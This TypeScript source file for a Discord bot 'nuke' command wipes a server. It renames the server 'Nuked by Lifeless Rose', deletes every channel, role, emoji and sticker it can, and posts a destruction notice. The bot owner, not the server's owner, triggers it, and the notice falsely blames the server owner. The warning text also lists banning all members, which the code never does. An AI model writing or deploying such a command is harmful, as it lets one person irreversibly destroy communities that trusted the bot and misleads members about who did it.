import { 
  CommandInteraction, 
  Message, 
  EmbedBuilder, 
  GuildMember,
  Guild,
  TextChannel,
  PermissionFlagsBits,
  Attachment,
  Collection,
  ChannelType,
  ButtonBuilder,
  ButtonStyle,
  ActionRowBuilder,
  ComponentType,
  User
} from "discord.js";
import { DiscordCommand } from "@shared/schema";
import { isOwner, handleOwnerOnlyCommand } from "../../utils/ownerCheck";
import { config } from "../../config";

/**
 * ⚠️ EXTREMELY DANGEROUS COMMAND - USE WITH EXTREME CAUTION ⚠️
 * 
 * This command can be used to completely destroy a server.
 * It is restricted to the bot owner only and requires multiple confirmations.
 */
export default {
  name: "nuke",
  description: "⚠️ DANGER: Completely destroy a server (Bot Owner Only)",
  category: "admin",
  aliases: ["destroy", "annihilate", "demolish"],
  slash: false, // Intentionally disabled for slash commands for safety
  prefix: true,
  cooldown: 0, // No cooldown since this requires multiple confirmations
  permissions: [],
  options: [],
  async execute(interaction: CommandInteraction | Message, args?: string[]) {
    // This command should only work with message commands for safety
    if (!(interaction instanceof Message)) {
      return interaction.reply({ 
        content: "⚠️ This command is too dangerous to be used as a slash command and can only be used with the prefix format.",
        ephemeral: true
      });
    }
    
    // Check if user is the bot owner
    const canContinue = await handleOwnerOnlyCommand(interaction, "nuke");
    if (!canContinue) return;
    
    // Get guild information
    const guild = interaction.guild;
    if (!guild) {
      return interaction.reply("❌ This command can only be used in a server.");
    }
    
    // Get activation code from arguments
    let activationCode = '';
    const confirmationKey = generateConfirmationKey();
    let reason = "No reason provided";
    
    if (!args || args.length < 1) {
      return interaction.reply({
        embeds: [
          new EmbedBuilder()
            .setTitle("⚠️ Server Destruction Protocol")
            .setDescription("This command requires an activation code and confirmation steps.")
            .addFields(
              { 
                name: "Usage", 
                value: `\`${config.prefix}nuke <activation_code> [reason]\`\n\n` +
                       `**Activation Code**: \`CONFIRM_DESTROY_${guild.id}\``
              },
              {
                name: "⚠️ WARNING",
                value: "This command will completely destroy the server and cannot be undone. " +
                       "Use this command only in servers you own or have explicit permission to destroy."
              }
            )
            .setColor(0xFF0000)
        ]
      });
    }
    
    activationCode = args[0];
    if (args.length > 1) {
      reason = args.slice(1).join(' ');
    }
    
    // Verify activation code
    const expectedCode = `CONFIRM_DESTROY_${guild.id}`;
    if (activationCode !== expectedCode) {
      return interaction.reply({
        embeds: [
          new EmbedBuilder()
            .setTitle("❌ Incorrect Activation Code")
            .setDescription("The activation code you provided is incorrect.")
            .addFields(
              { 
                name: "Expected", 
                value: `\`${expectedCode}\``
              }
            )
            .setColor(0xFF0000)
        ]
      });
    }
    
    // Send warning and confirmation buttons
    const warningEmbed = new EmbedBuilder()
      .setTitle("⚠️ SERVER DESTRUCTION SEQUENCE INITIATED")
      .setDescription(`You are about to completely destroy the server **${guild.name}**`)
      .addFields(
        { name: "Server ID", value: guild.id, inline: true },
        { name: "Member Count", value: `${guild.memberCount} members`, inline: true },
        { name: "Created At", value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:F>`, inline: true },
        { name: "Reason", value: reason },
        { 
          name: "⚠️ WARNING", 
          value: "This action will:\n" +
                "- Delete all channels\n" +
                "- Delete all roles\n" +
                "- Ban all members\n" +
                "- Delete all emojis and stickers\n" + 
                "- Rename the server\n\n" +
                "**THIS ACTION CANNOT BE UNDONE**"
        },
        {
          name: "Confirmation Required",
          value: `To confirm, enter the code: \`${confirmationKey}\``
        }
      )
      .setColor(0xFF0000)
      .setTimestamp();
    
    // Send initial warning
    const warningMessage = await interaction.reply({ 
      embeds: [warningEmbed]
    });
    
    // Create collector for confirmation
    const filter = (m: Message) => 
      m.author.id === interaction.author.id && 
      m.content.trim() === confirmationKey;
    
    const collector = interaction.channel.createMessageCollector({ 
      filter, 
      time: 30000, // 30 seconds to confirm
      max: 1 
    });
    
    // Handle confirmation
    collector.on('collect', async (confirmation) => {
      // User confirmed, proceed with destruction
      const startEmbed = new EmbedBuilder()
        .setTitle("🔥 SERVER DESTRUCTION SEQUENCE CONFIRMED")
        .setDescription(`Destruction of **${guild.name}** will begin in 10 seconds...`)
        .setColor(0xFF0000)
        .setTimestamp();
      
      await interaction.channel.send({ embeds: [startEmbed] });
      
      // Wait 10 seconds for dramatic effect and last chance to cancel
      await new Promise(resolve => setTimeout(resolve, 10000));
      
      // Final check
      const finalWarningEmbed = new EmbedBuilder()
        .setTitle("⚠️ FINAL WARNING")
        .setDescription("Server destruction is about to begin. THIS IS YOUR LAST CHANCE TO CANCEL.")
        .setColor(0xFF0000);
      
      const cancelButton = new ButtonBuilder()
        .setCustomId('cancel')
        .setLabel('CANCEL DESTRUCTION')
        .setStyle(ButtonStyle.Danger);
      
      const confirmButton = new ButtonBuilder()
        .setCustomId('confirm')
        .setLabel('CONFIRM DESTRUCTION')
        .setStyle(ButtonStyle.Success);
      
      const row = new ActionRowBuilder<ButtonBuilder>()
        .addComponents(cancelButton, confirmButton);
      
      const finalWarning = await interaction.channel.send({
        embeds: [finalWarningEmbed],
        components: [row]
      });
      
      // Create collector for the buttons
      const buttonCollector = finalWarning.createMessageComponentCollector({
        componentType: ComponentType.Button,
        time: 15000, // 15 seconds to decide
      });
      
      buttonCollector.on('collect', async (buttonInteraction) => {
        if (buttonInteraction.user.id !== interaction.author.id) {
          await buttonInteraction.reply({ 
            content: "Only the person who initiated this command can confirm or cancel it.", 
            ephemeral: true 
          });
          return;
        }
        
        if (buttonInteraction.customId === 'cancel') {
          await buttonInteraction.update({
            content: "✅ Server destruction has been cancelled.",
            embeds: [],
            components: []
          });
          buttonCollector.stop('cancelled');
        } else if (buttonInteraction.customId === 'confirm') {
          await buttonInteraction.update({
            content: "⚠️ Server destruction confirmed, proceeding with destruction sequence...",
            embeds: [],
            components: []
          });
          
          try {
            // Execute the server destruction
            await executeServerDestruction(guild, interaction.author, reason);
            
            // Final message
            await interaction.author.send({
              embeds: [
                new EmbedBuilder()
                  .setTitle("✅ Server Destruction Complete")
                  .setDescription(`The server **${guild.name}** has been successfully destroyed.`)
                  .setColor(0x2ECC71)
                  .setTimestamp()
              ]
            }).catch(() => {
              // Couldn't send DM, but destruction was completed
            });
          } catch (error) {
            console.error("Error during server destruction:", error);
            
            // Send error report
            await interaction.author.send({
              embeds: [
                new EmbedBuilder()
                  .setTitle("❌ Server Destruction Error")
                  .setDescription(`An error occurred during the destruction of ${guild.name}.`)
                  .addFields(
                    { name: "Error", value: String(error) }
                  )
                  .setColor(0xFF0000)
                  .setTimestamp()
              ]
            }).catch(() => {
              // Couldn't send DM
            });
          }
          
          buttonCollector.stop('confirmed');
        }
      });
      
      buttonCollector.on('end', (_, reason) => {
        if (reason !== 'cancelled' && reason !== 'confirmed') {
          finalWarning.edit({
            content: "Destruction sequence timed out.",
            embeds: [],
            components: []
          }).catch(() => {
            // Message might be deleted if server is destroyed
          });
        }
      });
    });
    
    collector.on('end', (collected) => {
      if (collected.size === 0) {
        interaction.channel.send({
          embeds: [
            new EmbedBuilder()
              .setTitle("❌ Destruction Sequence Aborted")
              .setDescription("Confirmation code was not provided in time.")
              .setColor(0x2ECC71)
          ]
        });
      }
    });
  }
} as DiscordCommand;

// Generate a random confirmation key
function generateConfirmationKey(): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let key = '';
  for (let i = 0; i < 8; i++) {
    key += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return key;
}

// Execute the actual server destruction
async function executeServerDestruction(guild: Guild, initiator: User, reason: string): Promise<void> {
  // Log the action for audit purposes
  console.log(`[CRITICAL] Server destruction initiated by ${initiator.tag} (${initiator.id}) for server ${guild.name} (${guild.id}). Reason: ${reason}`);
  
  try {
    // 1. Rename the server to Lifeless Rose
    await guild.setName(`Nuked by Lifeless Rose`);
    
    // 2. Delete all channels
    const channels = [...guild.channels.cache.values()];
    for (const channel of channels) {
      try {
        await channel.delete(`Server destruction initiated by ${initiator.tag}. Reason: ${reason}`);
      } catch (error) {
        console.error(`Failed to delete channel ${channel.name}:`, error);
      }
    }
    
    // 3. Delete all roles (except @everyone which can't be deleted)
    const roles = [...guild.roles.cache.values()].filter(role => role.id !== guild.id);
    for (const role of roles) {
      try {
        if (role.position < guild.members.me?.roles.highest.position!) {
          await role.delete(`Server destruction initiated by ${initiator.tag}. Reason: ${reason}`);
        }
      } catch (error) {
        console.error(`Failed to delete role ${role.name}:`, error);
      }
    }
    
    // 4. Delete all emojis
    const emojis = [...guild.emojis.cache.values()];
    for (const emoji of emojis) {
      try {
        await emoji.delete(`Server destruction initiated by ${initiator.tag}. Reason: ${reason}`);
      } catch (error) {
        console.error(`Failed to delete emoji ${emoji.name}:`, error);
      }
    }
    
    // 5. Delete all stickers
    const stickers = [...guild.stickers.cache.values()];
    for (const sticker of stickers) {
      try {
        await sticker.delete(`Server destruction initiated by ${initiator.tag}. Reason: ${reason}`);
      } catch (error) {
        console.error(`Failed to delete sticker ${sticker.name}:`, error);
      }
    }
    
    // 6. Create a channel to indicate the destruction
    try {
      const channel = await guild.channels.create({
        name: "server-destroyed",
        type: ChannelType.GuildText,
        permissionOverwrites: [
          {
            id: guild.id, // @everyone role
            deny: [
              PermissionFlagsBits.SendMessages,
              PermissionFlagsBits.AddReactions
            ],
            allow: [PermissionFlagsBits.ViewChannel]
          }
        ]
      });
      
      // Send a message in the channel
      await channel.send({
        embeds: [
          new EmbedBuilder()
            .setTitle("💥 THIS SERVER HAS BEEN DESTROYED 💥")
            .setDescription("This server has been completely destroyed by the server owner.")
            .addFields(
              { name: "Executed By", value: `${initiator.tag} (${initiator.id})` },
              { name: "Reason", value: reason },
              { name: "Time", value: new Date().toUTCString() }
            )
            .setColor(0xFF0000)
            .setTimestamp()
        ]
      });
    } catch (error) {
      console.error("Failed to create destruction notification channel:", error);
    }
    
  } catch (error) {
    console.error("Critical error during server destruction:", error);
    throw error;
  }
}